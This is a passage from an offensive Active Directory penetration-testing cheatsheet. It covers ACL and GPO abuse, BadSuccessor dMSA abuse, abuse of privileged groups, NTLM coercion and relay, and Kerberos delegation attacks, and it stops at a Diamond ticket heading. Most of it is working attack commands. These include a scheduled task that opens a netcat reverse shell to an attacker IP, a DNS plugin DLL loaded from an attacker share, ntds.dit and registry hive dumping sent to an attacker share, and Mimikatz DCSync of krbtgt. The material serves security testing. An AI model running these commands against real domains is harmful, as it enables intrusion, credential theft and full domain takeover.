#If needed, remove the admin from the msDS-NeverRevealGroup attribute
Set-DomainObject -Identity RODC-Server$ -Clear 'msDS-NeverRevealGroup'
```

#### On a group

##### WriteProperty/AllExtendedRights/GenericWrite Self
With one of this rights we can add a new member to the group

```powershell
net group <target_group> user1 /add
# With PowerView
Add-DomainGroupMember -Identity '<target_group>' -Members 'user1'
```

#### On a GPO

##### WriteProperty on a GPO
We can create an "evil" GPO with a scheduled task for example

```powershell
#With PowerView
New-GPOImmediateTask -Verbose -Force -TaskName 'Update' -GPODisplayName 'weakGPO' -Command cmd -CommandArguments "/c net localgroup administrators user1 /add"

#With SharpGPOAbuse
./SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author Administrator --Command "cmd.exe" --Arguments "/c /tmp/nc.exe attacker_ip 4545 -e powershell" --GPOName "weakGPO" 
```

##### CreateChild on Policies Cn + WriteProperty on an OU
It is possible to create a fully new GPO and link it to an existing OU

```powershell
#With RSAT module
New-GPO -Name "New GPO" | New-GPLink -Target "OU=Workstation,DC=domain,DC=local"
Set-GPPrefRegistryValue -Name "New GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /C \\path\to\payload" -Type ExpandString
```

After GPO refresh on the OU's machines, when the machines will restart the payload will be executed

##### Manage Group Policy Links

This section is presented in the Active Directory - Python edition cheatsheet.

#### On an OU

##### GenericWrite

With at least **GenericWrite** on an OU, it it possible to perform the same attacks presented in the GPO section with **Manage Group Policy Links**.

##### Create msDS-DelegatedManagedServiceAccount or Create all child objects

This is the BadSuccessor attack, presented in great details [here](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory). At least one Domain Controller must be a Windows Server 2025 to perform this attack (this permits to work with dMSA accounts).

```powershell
# With BadSuccessor.ps1
BadSuccessor -mode check -Domain domain.local 
BadSuccessor -mode exploit -Path <OU_DN> -Name "dMSA_name" -DelegatedAdmin "user1" -DelegateTarget "Administrator" -domain "domain.local"

# With SharpSuccessor
.\SharpSuccessor.exe add /impersonate:Administrator /path:<OU_DN> /account:user1 /name:"dMSA_name"

# Obtain a TGT
    # Request a TGT as the current user context, in this case user1
.\Rubeus.exe tgtdeleg /nowrap
    # Then use that TGT to impersonate the dMSA account
.\Rubeus.exe asktgs /targetuser:dMSA_name$ /service:krbtgt/domain.local /opsec /dmsa /nowrap /ptt /ticket:<TGT> /outfile:ticket.kirbi

# Then either request a ST for a desired service as our targeted user (Administrator in that case)
.\Rubeus.exe asktgs /user:dMSA_name$ /service:cifs/DC.domain.local /opsec /dmsa /nowrap /ptt /ticket:<TGT>
```

#### On the domain/forest

##### DS-Replication-Get-Changes + DS-Replication-Get-Changes-All
We can **DCSync**

##### DS-Replication-Get-Changes + DS-Replication-Get-Changes-In-Filtered-Set
It is possible to realize a **DirSync** attack, as presented [here](https://simondotsh.com/infosec/2022/07/11/dirsync.html).

```powershell
Import-Module ./DirSync.psm1

#Sync all the LAPS passwords in the domain
Sync-LAPS

#Sync a specific LAPS password
Sync-LAPS -LDAPFilter '(samaccountname=<computer$>)'

#Sync confidential attributs
Sync-Attributes -LDAPFilter '(samaccountname=user1)' -Attributes unixUserPassword,description
```

### Account Operators

The members of this group can add and modify all the non admin users and groups. Since **LAPS ADM** and **LAPS READ** are considered as non admin groups, it's possible to add an user to them, and read the LAPS admin password. They also can manage the **Server Operators** group members which can authenticate on the DC.

Another possibility, is to configure an AORTA attack, presented in [this section](/books/cheatsheets-82c/page/active-directory#bkmrk-account-operators-re).

#### Add user to LAPS groups

```powershell
Add-DomainGroupMember -Identity 'LAPS ADM' -Members 'user1' -Credential $cred -Domain "domain.local"
Add-DomainGroupMember -Identity 'LAPS READ' -Members 'user1' -Credential $cred -Domain "domain.local"
```

#### Read LAPS password

```powershell
Get-DomainComputer <computername> -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime
```

### DnsAdmins

* It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM).
* In case the DC also serves as DNS, this will provide us escalation to DA.
* Need privileges to restart the DNS service.

#### Configure the DLL

Needs RSAT DNS

```bash
#With dnscmd.exe
dnscmd <target> /config /serverlevelplugindll \\<attacker_IP>\dll\mimilib.dll

#With DNSServer module
$dnsettings = Get-DnsServerSetting -ComputerName <target> -Verbose -All
$dnsettings.ServerLevelPluginDll = "\\<attacker_IP>\dll\mimilib.dll"
Set-DnsServerSetting -InputObject $dnsettings -ComputerName <target> -Verbose
```

#### Restart DNS

```batch
sc \\<target> stop dns
sc \\<target> start dns
```

### Schema Admins

These group members can change the "_schema_" of the AD. It means they can change the ACLs on the objects that will be created **IN THE FUTUR**. If we modify the ALCs on the group object, only the futur group will be affected, not the ones that are already present.

#### Change ACLs on the groups

Give full rights to a user on the groups

```powershell
$creds = New-Object System.Management.Automation.PSCredential ("domain.local\user1", (ConvertTo-SecureString "Password" -AsPlainText -Force)); Set-ADObject -Identity "CN=group,CN=Schema,CN=Configuration,DC=domain,DC=local" -Replace @{defaultSecurityDescriptor = 'D:(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;DA)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;SY)(A;;RPLCLORC;;;AU)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;S-1-5-21-854239470-2015502385-3018109401-52104)';} -Verbose -server dc.domain.local -Credential $creds
```

When a new group is created we can add any user to it with the user who has full rights

```powershell
$User = Get-ADUser -Identity "CN=user1,CN=Users,DC=domain,DC=local"; $Group = Get-ADGroup -Identity "CN=new_admingroup,CN=Users,DC=domain,DC=local"; $creds = New-Object System.Management.Automation.PSCredential ("domain.local\user1", (ConvertTo-SecureString "Password" -AsPlainText -Force)); Add-ADGroupMember -Identity $Group -Members $User -Server dc.domain.local -Credential $creds
```

### Backup Operators

Can _generally_ log in on any machines of the domain.

#### File system backup

Can backup the **entire file system** of a machine (DC included) and have full read/write rights on the backup

To backup a folder :

```batch
robocopy /B C:\Users\Administrator\Desktop\ C:\tmp\tmp.txt /E
```

To backup with **Diskshadow + Robocopy**:

* Create a `script.txt` file to backup with Diskshadow

```
set verbose onX
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
```

* Backup with `diskshadow /s script.txt`
* Retrieve the backup with **robocopy** and send the NTDS file in the current folder : `robocopy /b E:\Windows\ntds . ntds.dit`
* Then retrieve the SYSTEM registry hive to decrypt and profit `reg save hklm\system c:\temp\system`

To backup with **Diskshadow + DLLs**:

* Similar script for Diskshadow

```
set context persistent nowritersx
set metadata c:\windows\system32\spool\drivers\color\example.cabx
add volume c: alias someAliasx
createx
expose %someAlias% z:x
exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.ditx
delete shadows volume %someAlias%x
resetx
```

* With [these](https://github.com/giuliano108/SeBackupPrivilege) DLLs

```powershell
Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll

Copy-FileSeBackupPrivilege z:\windows\ntds\ntds.dit C:\temp\ntds.dit -Overwrite
reg save HKLM\SYSTEM c:\temp\system.hive
```

#### Registry read rights

The **Backup Operators** can read all the machines registry

```bash
python3 reg.py 'domain.local'/'user1':'Password123'@<target>.domain.local query -keyName 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon'

#Backup the SAM, SECURITY and SYSTEM registry keys
reg.py -dc-ip <DC_IP> 'domain.local'/'user1':'Password123'@server.domain.local backup -o \\<attacker_IP>\share
```

#### GPOs read/write rights

Normally the **Backup Operators** can read and rights all the domain and DC GPOs with **robocopy** in **backup** mode

* Found the interesting GPO with `Get-NetGPO` . For example **Default Domain Policy** in the Domain Controller policy
* Get the file at the path `\\dc.domain.local\SYSVOL\domain.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf` and add whatever you want in it
* Write the file with **robocopy**:

```powershell
robocopy "C:\tmp" "\\dc.domain.local\SYSVOL\domain.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit" GptTmpl.inf /ZB
```

### Key Admins

Members of this group can perform [Shadow Credentials](/books/cheatsheets-82c/page/active-directory#bkmrk-on-a-computer) attacks against any objects, including the domain controllers.

### AD Recycle Bin

Members of this group can recover deleted objects from the Active Directory, just like in a recycle bin for files, when the feature is enabled. These objects can sometimes have interesting properties.&#x20;

#### Enumerate deleted objects

To find all the deleted objects and their properties:

```powershell
Get-ADObject -filter 'isdeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property *
```

To focus on one object:

```powershell
Get-ADObject -filter { SAMAccountName -eq "user1" } -includeDeletedObjects -property *
```

To find the last deleted object:

```powershell
Get-ADObject -ldapFilter:"(msDS-LastKnownRDN=*)" - IncludeDeletedObjects
```

#### Restore an object

```powershell
Get-ADObject -Filter {displayName -eq "user1"} IncludeDeletedObjects | Restore-ADObject
```

## Authentication capture, coerce and relay

### Capture, coerce and leak

Different ways to obtain and catch NTLM authentications and retrieve a NTLM response.

#### Responder / Inveigh

Change the authentication challenge to `1122334455667788` in the Responder conf file in order to obtain an easily crackable hash if **NTLMv1** is used.

```bash
sed -i 's/ Random/ 1122334455667788/g' Responder/Responder.conf
```

Catch all the possible hashes on the network (coming via LLMNR, NBT-NS, DNS spoofing, etc):

```bash
# Responder with WPAD injection, Proxy-Auth, DHCP, DHCP-DNS and verbose
responder -I interface_to_use -wPdDv

# Inveigh with *
Invoke-Inveigh -Challenge 1122334455667788 -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y
```

Force NTLM downgrade to NTLMv1 (will break the authentications if v1 is disabled on the machine):

```bash
# --disable-ess will disable the SSP, not always usefull
responder -I interface_to_use -wdDv --lm --disable-ess
```

**NTLMv1** response can be cracked on [crash.sh](https://crack.sh/) (we miss you guy).

#### Leak Files

With write rights on a SMB share, it is possible to drop a `.scf` file with the following content to grab some user hashes:

```
[Shell]
Command=2
IconFile=\<attacker_IP>\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

#### MITM6

(Python tool) Spoof DHCPv6 responses to provide evil DNS config. Usefull to combine with NTLM or Kerberos  Relay attacks. Here for an NTLM relay:

```bash
mitm6 -i interface_to_use -d domain.local -hw target.domain.local -v
```

Here for a Kerberos relay to ADCS:

```bash
mitm6 -i interface_to_use -d domain.local -hw target.domain.local --relay CA.domain.local -v
```

#### PetitPotam / PrinterBug / ShadowCoerce / DFSCoerce / CheeseOunce

Exploits to coerce Net-NTLM authentication from a computer. **PetitPotam** can be used without any credentials if no patch has been installed.

```powershell
#PetitPotam
./PetitPotam.exe attacker_IP target_IP

#PrinterBug
./SpoolSample.exe target_IP attacker_IP

#ShadowCoerce
python3.exe shadowcoerce.py -d domain.local -u user1 -p password attacker_IP target_IP

#DFSCoerce
python3.exe dfscoerce.py -u user1 -d domain.local <listener_IP> <target_IP>

#CheeseOunce via MS-EVEN
./MS-EVEN.exe <listener_IP> <target_IP>
```

#### MSSQL Coerce

* **MSSQL Analysis Services**: everything is explained [here](https://github.com/p0dalirius/MSSQL-Analysis-Coerce/blob/main/README.md).
* MSSQL Server : with [xp\_dirtree](/books/cheatsheets-82c/page/active-directory#bkmrk-rbcd-from-mssql-serv).

#### PrivExchange

Coerce Exchange server authentication via **PushSubscription** (now patched):

```bash
python3.exe privexchange.py -ah attacker_IP <Exchange_server> -u user1 -p password -d domain.local
```

#### WebClient Service

If this service runs on the target machine, a SMB authentication can be switched into an HTTP authentication (really useful for NTLM relay).

Check if WebClient is running on machines:

```bash
GetWebDAVStatus.exe 'machine_ip'

#For multiple machines
webclientservicescanner domain.local/user1:password@10.10.10.0/24
```

If yes, coerce the authentication to the port 80 on the attacker IP. To bypass trust zone restriction, the attacker machine must be specified with a valid **NETBIOS name** and not its IP. The **NETBIOS name** can be obtained with Responder in Analyze mode, or by adding a DNS record in the ADIDNS (Python tool).

```powershell
#Responder technique
responder -I interface_to_use -A

#ADIDNS technique
New-ADIDNSNode -Tombstone -Verbose -Node "attacker.domain.local" -Data $IP

#Coerce with PetitPotam for example
./PetitPotam.exe "attacker_NETBIOS@80/test.txt" <target_IP>
```

Otherwise, it's possible to force an HTTP authentication with a LLMNR poisoning [by changing the error code returned](https://www.synacktiv.com/publications/taking-the-relaying-capabilities-of-multicast-poisoning-to-the-next-level-tricking).

```bash
#With Responder + smbserver 
  #Start smbserver in a first terminal with authentication required
python3 smbserver.py $NAME . -smb2support -username notexist -password notexist
  #Start Responder in a second terminal
responder --interface interface_to_use

#Or only with Responder
responder --interface interface_to_use -E
```

### NTLM and Kerberos relay

#### SMB without signing

Create a list of computer without SMB signing:

```bash
nxc smb 10.10.10.0/24 --gen-relay-list list.txt
```

#### ntlmrelayx

If only SMBv2 is supported, `-smb2support` can be used. To attempt the remove the MIC if **NTLMv2** is vulnerable to **CVE-2019-1040**, `--remove-mic` can be used.

Multiple targets can be specified with `-tf list.txt`.

* Enumeration

```bash
#With attempt to dump possible GMSA and LAPS passwords, and ADCS templates
ntlmrelayx.py ldap://dc --dump-adcs --dump-laps --dump-gmsa --no-da --no-acl
```

* SOCKS

```bash
ntlmrelayx.py -t smb://target -socks
ntlmrelayx.py -t mssql://target -socks
ntlmrelayx.py -t ldaps://target -socks
```

* Creds dump

```bash
ntlmrelayx.py smb://target
```

* DCSync if the target in vulnerable to Zerologon

```bash
ntlmrelayx.py dcsync://dc
```

* Privesc

Add an user to **Enterprise Admins**.

```bash
ntlmrelayx.py ldap://dc --escalate-user user1 --no-dump
```

* Kerberos Delegation

Kerberos RBCD are detailled in the following section.

```bash
#Create a new computer account through LDAPS and enabled RBCD
ntlmrelayx.py ldaps://dc_IP --add-computer --delegate-access --no-dump --no-da --no-acl

#Create a new computer account through LDAP with StartTLS and enabled RBCD
ntlmrelayx.py ldap://dc_IP --add-computer --delegate-access --no-dump --no-da --no-acl

#Doesn't create a new computer account and use an existing one
ntlmrelayx.py ldap://dc_IP --escalate-user <controlled_computer> --delegate-access --no-dump --no-da --no-acl
```

* Shadow Credentials

```bash
ntlmrelayx.py -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'
```

* From a mitm6 authent

```bash
#Attempts to open a socks and write loot likes dumps into a file
ntlmrelayx.py -tf targets.txt -wh attacker.domain.local -6 -l loot.txt -socks
```

* Targeting GPO

This attack is presented in the Active Directory - Python edition cheatsheet.

* Relay to WinRMs

If **NTLMv1 is enabled** on the source server and accepted by the target, and the target server exposes the WinRMs service (over HTTPS), without forcing CBT. Use this [PR](https://github.com/fortra/impacket/pull/1947).

```bash
#Perform the relay
ntlmrelayx -t winrms://target.domain.local -smb2support

#Use the opened WinRMs shell
nc 127.0.0.1 11000
```

* [CVE-2025-33073](/books/cheatsheets-82c/page/active-directory#bkmrk-ad-oriented) - NTLM Reflective relay
* [ADCS ESC8 & 11](/books/cheatsheets-82c/page/active-directory-certificate-services#bkmrk-relay-attacks---esc8)
* [SCCM primary site takeover](/books/cheatsheets-82c/page/active-directory#bkmrk-sccm-%2F-mecm)

#### krbrelayx

All the attacks related to Kerberos relay are presented in the Active Directory - Python edition cheatsheet.

#### krbjack

A tool ([https://github.com/almandin/krbjack](https://github.com/almandin/krbjack)) to perform DNS updates thanks to the `ZONE_UPDATE_UNSECURE` flag in the DNS configuration. Perform a MiTM between any client and a target machine by changing its DNS resolution, forward all the packets to the specified ports, and steal the `AP_REQ` packets on the fly to reuse them.

This attack is presented in the Active Directory - Python edition cheatsheet.

## Kerberos Delegations

Kerberos delegations can be used for local privesc, lateral movement or domain privesc. The main purpose of Kerberos delegations is to permit a principal to access a service on behalf of another principal.

There are two main types of delegation:

* **Unconstrained Delegation**: the first hop server can request access to any service on any computer
* **Constrained Delegation**: the first hop server has a list of service it can request

### Unconstrained delegation

#### Compromised machine in Unconstrained Delegation

* Enumerate computers with Unconstrained Delegation

```powershell
Get-NetComputer -UnConstrained

#With AD Module
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}
```

* Get admin ticket

After compromising the computer with UD enabled, we can trick or wait for an admin connection

```powershell
#Check if a ticket is available
Invoke-Mimikatz -Command '"sekurlsa::tickets"'

#If yes
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```

* Reuse the ticket

```powershell
Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'
```

#### Printer bug / PetitPotam

To force another computer to connect to the compromised machine in UD, and capture the TGT by monitoring:

```powershell
.\Rubeus.exe monitor /interval:5 /nowrap
```

On the attacker machine run :

```powershell
#PrinterBug
.\MS-RPRN.exe \\<target>.domain.local \\unconstrainedMachine.domain.local

#PetitPotam
.\PetitPotam.exe attacker_ip <target>.domain.local
```

```powershell
.\Rubeus.exe ptt /ticket:...

#DCSync with the dc TGT
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"' 
```

#### Any principal in Unconstrained Delegation

If we have enough rights against a principal (computer or user) in UD to add a **SPN** on it and **know its password**, we can try to use it to retrieve a machine account password from an authentication coercion.

* Add a new DNS record on the domain that point to our IP
* Add a SPN on the principal that point to the DNS record and change its password (will be usefull for the tool `krbrelayx.py` to extract the TGT from the ST)
* Trigger the authentication and grab the ST (and TGT in it) on **krbrelayx** that is listenning for it

Since the principal is in **Unconstrained Delegation**, when the machine account will send the **ST** to the SPN it will automatically add a **TGT** in it, and because the SPN is pointing to us with the DNS record, we can retrieve the ST, decipher the ciphered part with the user password (the SPN is setup on the user, so the ST is ciphered with his password), and retrieve the TGT.

```powershell
#Add the SPN with the Microsoft module
Set-ADUser -Identity <principal_in_UD> -ServicePrincipalName @{Add='HOST/test.domain.local'}

#Create the DNS record
Invoke-DNSUpdate -DNSType A -DNSName test.domain.local -DNSData <attacker_IP> -Realm domain.local

#Run krbrelayx with the hash of the password setup on the UD user
python3 krbrelayx.py -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -dc-ip dc.domain.local

#Trigger the coercion
.\PetitPotam.exe <attacker_ip> <target_IP>
```

### Constrained delegation

In this situation, the computer in delegation has a list of services where it can delegate an authentication. This is controlled by `msDS-AllowedToDelegateTo` attribute that contains a list of SPNs to which the user tokens can be forwarded. No ticket is stored in LSASS.

To impersonate the user, Service for User (S4U) extension is used which provides two extensions:

* Service for User to Self (**S4U2self**) - Allows a service to obtain a forwardable ST to itself on behalf of a user with just the user principal name without supplying a password. The service account must have the **TRUSTED\_TO\_AUTHENTICATE\_FOR\_DELEGATION** – T2A4D UserAccountControl attribute.
* Service for User to Proxy (**S4U2proxy**) - Allows a service to obtain a ST to a second service on behalf of a user.

#### Enumerate principals with CD enabled

```powershell
#Powerview
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

#AD Module
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

#### With protocol transition

Any service can be specified on the target since it is not correctly checked. All the Rubeus commands can be performed with kekeo aswell.

* Request a ticket for multiple services on the target, for another user (S4U)

```powershell
.\Rubeus.exe s4u /user:user1 /rc4:<hash> /impersonateuser:Administrator /msdsspn:"time/<target>.domain.local" /altservice:ldap,cifs /ptt
```

If we have a session as the user, we can just run `.\Rubeus.exe tgtdeleg /nowrap` to get the TGT in Base64, then run:

```powershell
.\Rubeus.exe s4u /ticket:doIFCDC[SNIP]E9DQUw= /impersonateuser:Administrator /domain:domain.local /msdsspn:"time/<target>.domain.local" /altservice:ldap,cifs /ptt
```

* Inject the ticket

```powershell
Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'
```

#### Without protocol transition

In this case, it is not possible to use **S4U2self** to obtain a forwardable ST for a specific user. This restriction can be bypassed with an RBCD attack detailled in the following section.

### Resource-based constrained delegation

[Wagging the Dog](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)

With RBCD, this is the resource machine (the machine that receives delegation) which has a list of services that can delegate to it. This list is specified in the attribute `msds-allowedtoactonbehalfofotheridentity` and the computer can modified its own attribute (really usefull in NTLM relay attack scenario).

#### Requirements

* The DC has to be at least a **Windows Server 2012**
* Domain users can create some machines, `ms-ds-machineaccountquota` must not being to 0

```powershell
#To verify
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local
```

* Write rights on the target machine (**GenericAll, GenericWrite, AllExtendedRights**)
* Target computer, object must not have the attribute `msds-allowedtoactonbehalfofotheridentity` set

```powershell
Get-NetComputer ws01 | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
```

#### Standard RBCD

The attaker has compromised ServiceA and want to compromise ServiceB. Additionnally he has sufficient rights to configure `msds-allowedtoactonbehalfofotheridentity` on ServiceB.

```powershell
#Add RBCD from ServiceA to ServiceB
Set-ADComputer ServiceB -PrincipalsAllowedToDelegateToAccount ServiceA$

#Verify property
Get-NetComputer ServiceB | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity

#Get ServiceA TGT and then S4U
rubeus -x tgtdeleg /nowrap
rubeus -x s4u /user:ServiceA$ /ticket:ticket.kirbi /impersonateuser:administrator /msdsspn:host/ServiceB.domain.local /domain:domain.local /altservice:cifs,host,http,winrm,RPCSS,wsman /ptt
```

#### With machine account creation

* Add a fake machine account in the domain
* Add it the to `msds-allowedtoactonbehalfofotheridentity` attribute of the target machine

```powershell
Import-Module Powermad.ps1
Import-Module PowerView.ps1

#Creds if needed, to run as another user
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('domain.local\user1', $SecPassword)

#Check requirements
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local -Credential $Cred
Get-NetComputer <target> -Domain domain.local | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity

#Add the fake machine as a ressource + get its SID
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force) -Credential $Cred -Verbose -Domain domain.local -DomainController DC.domain.local
Get-DomainComputer FAKE01 -Domain domain.local -Credential $Cred
$ComputerSid = Get-DomainComputer FAKE01 -Properties objectsid | Select -Expand objectsid

#Create the new raw security descriptor
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

#Add the new raw SD to msds-allowedtoactonbehalfofotheridentity
Get-DomainComputer <target> -SearchBase "LDAP://DC=domain,DC=local" -Credential $Cred | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -SearchBase "LDAP://DC=domain,DC=local" -Verbose -Credential $Cred

#Check if well added
$RawBytes = Get-DomainComputer <target> -Properties 'msds-allowedtoactonbehalfofotheridentity' -Credential $Cred -SearchBase "LDAP://DC=domain,DC=local" | select -expand msds-allowedtoactonbehalfofotheridentity
(New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).DiscretionaryAcl
```

* Use the **S4USelf** function with the fake machine (on an arbitrary SPN) to create a forwardable ticket for a wanted user (not **protected**)
* Use the **S4UProxy** function to obtain a ST for the impersonated user for the wanted service on the target machine

```powershell
#Calcul hash
.\Rubeus.exe hash /password:Password123! /user:FAKE01$ /domain:domain.local
#S4U attack
.\Rubeus.exe s4u /user:FAKE01$ /rc4:2B576ACBE6BCFDA7294D6BD18041B8FE /impersonateuser:administrator /msdsspn:cifs/<target> /domain:domain.local /ptt /dc:DC.domain.local
```

#### Skip S4USelf

* Attacker has compromised Service A, has sufficient ACLs against Service B to configure RBCD, and wants to attack Service B
* By social engineering or any other solution, an interesting victim authenticates to Service A with a ST
* Attacker dumps the ST on Service A (`sekurlsa::tickets`)
* Attacker configures RBCD from Service A to Service B as above
* Attacker performs S4UProxy and bypass S4USelf by providing the ST as evidence

```powershell
.\Rubeus.exe s4u /user:ServiceA$ /aes256:<service_key> /tgs:"/path/to/kirbi" /msdsspn:cifs/serviceB.domain.local /domain:domain.local /ptt /dc:DC.domain.local
```

#### Reflective RBCD

With a TGT or the hash of a service account, an attacker can configure a RBCD from the service to itself, a run a full S4U to access the machine on behalf of another user.

```powershell
Set-ADComputer ServiceA -PrincipalsAllowedToDelegateToAccount ServiceA$
.\Rubeus.exe s4u /user:ServiceA$ /aes256:<service_key> /impersonateuser:Administrator /msdsspn:cifs/serviceA.domain.local /domain:domain.local /ptt /dc:DC.domain.local
```

#### Impersonate protected user via S4USelf request

It is possible to impersonate a **protected** **user** with the **S4USelf** request if we have a TGT (or the creds) of the target machine (for example from an **Unconstrained Delegation**).

With the target TGT it is possible to realise a S4USelf request for any user and obtain a ST for the service. In case where the needed user is protected against delegation, S4USelf will still work, but the ST is not forwardable (so no S4UProxy possible) and the specified SPN is invalid...however, the SPN is not in the encrypted part of the ticket. So it is possible to modify the SPN and retrieve a valid ST for the target service with a sensitive user (and the ST PAC is well signed by the KDC).

```powershell
.\Rubeus.exe s4u /self /impersonateuser:Administrator /ticket:doIFFz[...SNIP...]TE9DQUw=  /domain:domain.local /altservice:cifs/server.domain.local /ptt
```

#### Bypass Constrained Delegation restrictions with RBCD

* Attacker compromises **ServiceA** and **ServiceB**
* ServiceB is allowed to delegate to `time/ServiceC` (the target) without protocol transition (no S4USelf)
* Attacker configures RBCD from ServiceA to ServiceB and performs a full S4U attack to obtain a forwardable ST for the Administrator to ServiceB
* Attacker reuses this forwardable ST as evidence to realise a S4UProxy attack from ServiceB to `time/ServiceC`
* Since the service is not protected in the obtained ticket, the attacker can change the ST from the previous S4UProxy execution to `cifs/ServiceC`

```powershell
#RBCD from A to B
Set-ADComputer ServiceB -PrincipalsAllowedToDelegateToAccount ServiceA$
.\Rubeus.exe s4u /user:ServiceA$ /aes256:<serviceA_key> /impersonateuser:Administrator /msdsspn:cifs/serviceB.domain.local /domain:domain.local /dc:DC.domain.local

#S4UProxy from B to C with the obtained ST as evidence
.\Rubeus.exe s4u /user:ServiceB$ /aes256:<serviceB_key> /tgs:<obtained_TGS> /msdsspn:time/serviceC.contoso.local /altservice:cifs /domain:domain.local /dc:DC.domain.local /ptt
```

#### U2U RBCD with SPN-less accounts

In case where you have sufficient rights to configure an RBCD on a machine (for example with an unsigned authentication coerce via HTTP) but `ms-ds-machineaccountquota` equals 0, there is no ADCS with the HTTP endpoint and the Shadow Credentials attack is not possible (domain level to 2012 for example), you can realize a RBCD from a SPN-less user account. An interesting example is present [here](https://twitter.com/snovvcrash/status/1595814518558543874). You can follow the example in this [PR](https://github.com/GhostPack/Rubeus/pull/137).

* Configure the machine account to trust the user account you control (NTLM Relay, with the machine account's creds,...)
* Obtain a TGT for the user via pass-the-hash:

```powershell
.\Rubeus.exe asktgt /user:user1 /rc4:<NT_hash> /nowrap
```

* Request a Service Ticket via U2U (S4USelf request) with the previous TGT specified in `/tgs:` (additional ticket added to the request body identifying the target user account) and `/ticket:` (authentication). If U2U is not used, the KDC cannot find the account's LT key when a UPN is specified instead of a SPN. The account to impersonate via the futur S4U request is also present:

```powershell
.\Rubeus.exe asktgs /u2u /ticket:TGT.kirbi /tgs:TGT.kirbi /targetuser:Administrator /nowrap
```

* Retrieve the TGT session key in HEX format:

```python
import binascii, base64
print(binascii.hexlify(base64.b64decode("<TGT_SESSION_KEY_B64>")).decode())
```

* Now, change the user's long term key (his RC4 NT hash actually) to be equal to the TGT session key. The ST sent in the S4UProxy is encrypted with the session key, but the KDC will try to decipher it with the user's long term key, this is why the LT key must be equal to the session key (**WARNING !!! The user's password is now equal to an unknown value, you have to use a sacrificial account to realise this attack**). Everything is explained [here](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html).

```bash
smbpasswd.py -newhashes :sessionKey 'domain.local'/'user1':'Password123!'@'DC'
```

* Realize the S4UProxy request with the previous S4USelf U2U ticket (ciphered with the session key) as additional ticket and the original TGT as ticket:

```powershell
.\Rubeus.exe s4u /msdsspn:cifs/target.domain.local /ticket:TGT.kirbi /tgs:U2U.kirbi
```

* Finally, use this ticket to do whatever you want

#### RBCD from MSSQL server

If we have sufficient access to a MSSQL server we can use the `xp_dirtree` in order to leak the Net-NTLM hash of the machine account. Additionally, the **Web Service** client must be running on the machine in order to trick the authentication from SMB to HTTP and avoid the NTLM signature (authentication must be sent to `@80`):

* Create a DNS record in order to be able to leak the NTLM hash externally
* Use the `xp_dirtree` (or `xp_fileexist`) function to the created DNS record on `@80`. This will force the authentication and leak the hash
* Relay the machine hash to the LDAP server to add a controlled account (**with a SPN** for the further S4USelf request) to the `msDS-AllowedToActOnBehalfOfOtherIdentity` of the target machine
* Now we can ask a ST for a user we want to impersonate for a service on the machine

```powershell
#Add the DNS
Invoke-DNSUpdate -DNSType A -DNSName attacker.domain.local -DNSData <attacker_IP> -Realm domain.local

#On our machine, waiting for the leak
#https://gist.github.com/3xocyte/4ea8e15332e5008581febdb502d0139c
python rbcd_relay.py 192.168.24.10 domain.local 'target$' <controlledAccountWithASPN>

#ON the MSSQL server
SQLCMD -S <MSSQL_instance> -Q "exec master.dbo.xp_dirtree '\\attacker@80\a'" -U Admin -P Admin

#After the attack, ask for a ST with full S4U
.\Rubeus.exe s4u /user:<controlled_account> /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/<target> /domain:domain.local /dc:DC.domain.local /ptt
```

## Domain Persistence

### Diamond ticket

[Blog here](https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/)

```powershell
